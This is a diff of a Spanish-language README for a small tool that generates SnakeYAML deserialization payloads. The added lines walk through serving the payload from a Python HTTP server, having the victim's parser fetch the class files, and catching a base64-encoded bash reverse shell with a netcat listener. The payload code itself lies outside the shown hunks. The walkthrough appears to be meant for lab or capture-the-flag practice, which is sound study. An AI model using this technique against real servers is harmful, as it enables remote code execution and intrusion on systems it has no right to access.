@@ -10,10 +10,17 @@ Esto lo pondremos en el servidor victima para que nos ejecute nuestro payload  c
   ]]
 ]
 ```
+![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/parser_web.jpg)
+
+!Nota!
+Si quereis probar antes de poner el payload en el server de python ,lo probais sin nada y vereis las peticiones que hace el parser a nuestro server..
+
 En nuestra terminal compartiremos un server con python para que se conecte nuestra victima hacia nosotros asi cargar el payload.
 ```bash
 sudo python3 -m hhtp.server 80
 ```
+![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/python%20server.jpg)
+
 Editaremos nuestro archivo AwesomeScriptEngineFactory.java
 y añadiremos nuestra reverse_shell en bash pero codificado en base64 lo codificaremos en esta pagina.
 ```reverse
@@ -39,8 +46,9 @@ La estructura del Payload tiene que ser asi para que el servidor haga la peticio
   |-->      h1dr0/AwesomeScriptEngineFactory.class
 ```
 
+Al darle a parse en la web veremos en nuestro servidor que esta haciendo la peticion de los archivos y en otra shell tendremos el nc preparado
 
-
+![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/nc.jpg)
 
 A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):
 
